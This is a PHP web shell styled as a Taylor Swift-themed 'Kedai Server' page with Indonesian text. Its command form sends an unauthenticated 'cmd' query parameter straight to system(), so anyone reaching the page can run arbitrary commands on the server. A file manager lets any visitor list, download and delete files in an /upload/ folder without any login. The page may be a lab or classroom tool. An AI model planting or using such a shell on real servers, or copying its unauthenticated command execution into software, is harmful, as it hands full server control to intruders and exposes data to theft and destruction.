<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Webshell ✨ Kedai Server (Taylor's Version)</title>
    <style>
        /* CSS Theme: Taylor Swift (Lover & Reputation Era) */
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #ffe5ec 0%, #f0e6ff 50%, #e8dbfc 100%); 
            color: #4a3b40; 
            margin: 0; 
            padding: 40px 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.75);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(233, 170, 185, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.6);
        }
        
        /* Header & Typografi Swiftie */
        h1 { 
            font-family: 'Georgia', serif; 
            color: #d4a373; 
            text-align: center; 
            margin-top: 0;
            font-size: 28px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.05);
        }
        h2 { 
            font-family: 'Georgia', serif; 
            color: #b5838d; 
            border-bottom: 2px dashed #ffb6c1; 
            padding-bottom: 8px; 
            margin-top: 30px;
            font-size: 20px;
        }
        .subtitle {
            text-align: center;
            font-style: italic;
            color: #9a8c98;
            margin-bottom: 30px;
            font-size: 13px;
        }
        
        /* Form Terminal */
        .form-inline { 
            display: flex;
            gap: 10px;
            margin-bottom: 15px; 
        }
        #cmd { 
            flex: 1;
            padding: 12px 15px; 
            border: 2px solid #ffcad4; 
            border-radius: 50px; 
            background-color: rgba(255, 255, 255, 0.9); 
            color: #4a3b40;
            font-family: 'Courier New', Courier, monospace;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        #cmd:focus { 
            outline: none; 
            border-color: #ffb5a7; 
            box-shadow: 0 0 10px rgba(255, 181, 167, 0.5); 
        }
        .btn-execute { 
            padding: 12px 25px; 
            background: linear-gradient(45deg, #ffb6c1, #b5838d); 
            color: white; 
            border: none; 
            border-radius: 50px; 
            cursor: pointer; 
            font-weight: bold; 
            box-shadow: 0 4px 10px rgba(181, 131, 141, 0.3);
            transition: all 0.3s ease;
        }
        .btn-execute:hover { 
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(181, 131, 141, 0.5);
        }
        
        /* Kotak Output Terminal (Reputation Vibe) */
        .output-box { 
            background-color: #2b2d42; 
            color: #f7fff7; 
            padding: 18px; 
            border-radius: 12px; 
            box-shadow: inset 0 0 15px rgba(0,0,0,0.3); 
            min-height: 120px; 
            font-family: 'Courier New', Courier, monospace;
            white-space: pre-wrap; 
            margin-bottom: 35px; 
            font-size: 14px;
            line-height: 1.5;
        }
        .cmd-echo { color: #f28482; font-weight: bold; display: block; margin-bottom: 12px; border-bottom: 1px solid #457b9d; padding-bottom: 5px; }
        .no-output { color: #b5b5b5; font-style: italic; text-align: center; padding-top: 30px; }

        /* Tabel Manajemen Berkas */
        table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: 15px; 
            background-color: rgba(255, 255, 255, 0.9); 
            border-radius: 12px; 
            overflow: hidden; 
            box-shadow: 0 5px 15px rgba(0,0,0,0.02); 
        }
        th, td { padding: 14px 18px; text-align: left; }
        th { 
            background: linear-gradient(to right, #ffcad4, #f4acb7); 
            color: #6d5959; 
            font-family: 'Georgia', serif;
            font-weight: bold;
        }
        td { border-bottom: 1px solid #ffe5ec; color: #5c5052; font-size: 14px; }
        tr:hover { background-color: #ffeef2; }
        
        /* Tombol Aksi */
        .btn { 
            padding: 6px 14px; 
            text-decoration: none; 
            color: white; 
            border-radius: 20px; 
            font-size: 12px; 
            font-weight: bold; 
            margin-right: 6px;
            display: inline-block;
            transition: all 0.2s ease;
        }
        .btn-download { background-color: #98c1d9; color: #2b2d42; }
        .btn-download:hover { background-color: #3d5a80; color: white; }
        .btn-delete { background-color: #f28482; }
        .btn-delete:hover { background-color: #e05753; }
        
        /* Toast / Alert Box */
        .alert-msg { 
            padding: 15px; 
            background-color: #fff3f5; 
            color: #e05753; 
            border-left: 5px solid #f28482; 
            margin-bottom: 20px; 
            border-radius: 8px; 
            font-size: 14px;
            font-weight: 500;
        }
        .alert-success {
            background-color: #e8f5e9;
            color: #2e7d32;
            border-left: 5px solid #81c784;
        }
    </style>
</head>
<body>

<div class="container">

    <h1>💘 Kedai Server (Taylor's Version) 👑</h1>
    <div class="subtitle">"Cause we never go out of style..." — Taylor Swift</div>

    <h2>🎤 Reputation Command Executor</h2>
    <form method="GET" action="<?php echo htmlspecialchars(basename($_SERVER['PHP_SELF'])); ?>" class="form-inline">
        <input type="text" name="cmd" id="cmd" autofocus placeholder="I knew you were trouble when you walked in, type command here...">
        <button type="submit" class="btn-execute">Execute ✨</button>
    </form>

    <div class="output-box">
    <?php
    // 1. UTAMA: EXECUTE COMMAND TERMINAL
    if (isset($_GET['cmd']) && $_GET['cmd'] !== '') {
        $cmd = $_GET['cmd'];
        echo "<span class='cmd-echo'>🔮 swiftie_terminal@kedaiserver:~# " . htmlspecialchars($cmd) . "</span>";
        system($cmd); 
    } else {
        echo "<div class='no-output'>💘 " . '"Baby, let the games begin..."' . "<br><small style='color:#777;'>Siap menerima perintah, Tuan Putri!</small></div>";
    }
    ?>
    </div>

    <h2>💿 Lover File Manager (Unduh & Hapus)</h2>
    
    <?php
    // Folder penampung tugas kamu
    $dir = __DIR__ . "/upload/";

    // 2. LOGIKA PROSES DELETE
    if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['file'])) {
        $file_to_delete = basename($_GET['file']);
        $target_delete_path = $dir . $file_to_delete;
        
        if (file_exists($target_delete_path)) {
            if (unlink($target_delete_path)) {
                echo "<div class='alert-msg alert-success'>✨ <strong>" . htmlspecialchars($file_to_delete) . "</strong> has been shaken off! (Berkas berhasil dihapus).</div>";
            }
        }
    }

    // 3. LOGIKA PROSES DOWNLOAD + VALIDASI IMAGE
    if (isset($_GET['action']) && $_GET['action'] == 'download' && isset($_GET['file'])) {
        $file_to_download = basename($_GET['file']);
        $target_download_path = $dir . $file_to_download;

        if (file_exists($target_download_path)) {
            $fileType = strtolower(pathinfo($target_download_path, PATHINFO_EXTENSION));
            $allowedTypes = array("jpg", "jpeg", "png", "gif");
            $checkImage = @getimagesize($target_download_path);

            // Validasi ketat: Ekstensi wajib gambar dan struktur file asli gambar
            if (in_array($fileType, $allowedTypes) && $checkImage !== false) {
                header('Content-Description: File Transfer');
                header('Content-Type: ' . $checkImage['mime']);
                header('Content-Disposition: attachment; filename="' . $file_to_download . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($target_download_path));
                flush(); 
                readfile($target_download_path);
                exit;
            } else {
                echo "<div class='alert-msg'>❌ <strong>Look What You Made Me Do!</strong> Akses ditolak. Fitur unduh ini diproteksi validasi ketat dan hanya menerima berkas IMAGE saja, Tuan Putri!</div>";
            }
        }
    }
    ?>

    <table>
        <thead>
            <tr>
                <th>Nama Berkas</th>
                <th>Aksi</th>
            </tr>
        </thead>
        <tbody>
            <?php
            if (is_dir($dir)) {
                $files = array_diff(scandir($dir), array('.', '..'));
                if (count($files) > 0) {
                    foreach ($files as $file) {
                        echo "<tr>";
                        echo "<td>📝 " . htmlspecialchars($file) . "</td>";
                        echo "<td>";
                        echo "<a href='?action=download&file=" . urlencode($file) . "' class='btn btn-download'>Unduh</a>";
                        echo "<a href='?action=delete&file=" . urlencode($file) . "' class='btn btn-delete' onclick='return confirm(\"Apakah Anda yakin ingin menghapus file ini?\")'>Hapus</a>";
                        echo "</td>";
                        echo "</tr>";
                    }
                } else {
                    echo "<tr><td colspan='2' class='no-output' style='color: #9a8c98;'>" . '"The room is empty now..."' . "<br>Belum ada berkas terunggah di folder /upload/.</td></tr>";
                }
            } else {
                echo "<tr><td colspan='2' class='alert-msg'>Folder /upload/ tidak ditemukan di server!</td></tr>";
            }
            ?>
        </tbody>
    </table>

</div>

</body>
</html>